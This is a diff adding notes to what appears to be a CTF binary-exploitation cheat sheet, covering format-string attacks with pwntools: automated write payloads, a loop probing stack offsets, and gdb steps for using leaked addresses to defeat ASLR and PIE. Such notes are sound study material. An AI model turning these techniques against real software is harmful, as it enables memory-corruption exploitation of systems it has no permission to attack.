@@ -164,3 +164,41 @@ p.interactive()
 
 ```
 
+## Format strings automation
+```python
+fmtstr_payload(offset=12, writes{old_address: new_address})
+```
+
+## Types of Addresses Leaked & Offset Calculations
+To see all possible outputs of format string, use a loop:
+
+```python
+e = ELF('./binary_name')
+
+for i in range(20):
+    io = e.process()
+    io.sendline(f"AAAA %{i}$x")
+    io.recvline()
+    print(f"{i} - {io.recvline().strip()}")
+    io.close()
+```
+
+1. The address containing 41414141 which identifies where the AAAA's are. These are the memory addresses that be can overwrite.
+2. Addresses starting with `f7` are libc memory addresses. These can be used to calculate libc.address and defeat ASLR. First, calculate `offset`:
+```
+Leaked address of libc - Base Address (vmmap) = offset
+gdb > p/x addr libc - base
+gdb > $1 
+```
+We can now set `libc.address = Leaked address - offset`  
+We can now use gadgets from libc: `libc.address + gadget offset`
+3. Addresses starting with `56` are binary addresses which can be useful to calculate PIE offset. 
+Use gdb to do this.
+```
+gdb > p/x Leaked address of binary - Base Address of binary = pie offset
+gdb > $1
+```
+We can now set `elf.address = Leaked address - pie offset`
+We can now use gadgets from the binary: `gadget offset  + pie offset`
+We can now use functions from the GOT `exit_got = elf.got["exit"]`
+Note: always ends in 000
